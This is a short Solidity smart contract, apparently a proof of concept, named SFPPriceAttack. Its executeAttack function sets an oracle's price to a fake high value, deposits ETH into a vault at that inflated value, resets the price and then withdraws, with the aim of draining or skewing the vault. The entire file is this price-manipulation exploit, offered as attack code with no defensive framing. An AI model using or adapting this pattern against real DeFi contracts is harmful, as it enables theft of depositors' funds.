// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

interface IOracle {
    function setPrice(uint256 newPrice) external;
}

contract SFPPriceAttack {
    IOracle public oracle;
    IVault public vault;

    constructor(address _oracle, address _vault) {
        oracle = IOracle(_oracle);
        vault = IVault(_vault);
    }

    function executeAttack() external payable {
        require(msg.value > 0, "Send ETH");

        // 1. Manipulate oracle price temporarily
        oracle.setPrice(2000 ether); // fake high price

        // 2. Deposit ETH into vault at fake high value
        vault.deposit{value: msg.value}();

        // 3. Revert price
        oracle.setPrice(1000 ether);

        // 4. Withdraw shares after value crash (trigger vault loss or skew)
        vault.withdraw();
    }

    receive() external payable {}
}
